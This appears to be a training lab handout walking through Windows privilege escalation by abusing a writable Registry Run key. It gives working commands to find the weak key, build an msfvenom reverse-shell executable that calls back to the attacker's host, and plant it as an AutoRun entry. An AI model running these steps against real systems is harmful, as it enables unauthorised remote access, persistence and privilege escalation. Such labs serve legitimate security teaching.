Hands-on Activity

Identifying and Injecting a Malicious AutoRun Entry

A practical walkthrough to achieve privilege escalation.

Activity Steps Overview

  1. 1.Identify Vulnerable Registry Key (reg query, accesschk.exe).
  2. 2.Create Malicious Executable (msfvenom).
  3. 3.Transfer and Inject (reg add).
  4. 4.Trigger and Exploit (User login/reboot).
Key Takeaway

This activity demonstrates the full lifecycle of a Registry AutoRun exploit, from discovery to privilege escalation.

Key Commands
# Identify vulnerable key
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
accesschk.exe -uwcqv "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Create payload (Kali)
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_KALI_IP> LPORT=4444 -f exe -o startup.exe

# Inject malicious entry (Windows)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousStartup" /t REG_SZ /d "C:\Temp\startup.exe" /f

Expected Outcome

Upon successful execution, your Netcat listener on Kali should receive a reverse shell with the privileges of the user who triggered the AutoRun entry. This confirms that you have successfully exploited the Registry vulnerability to escalate privileges on the target system.
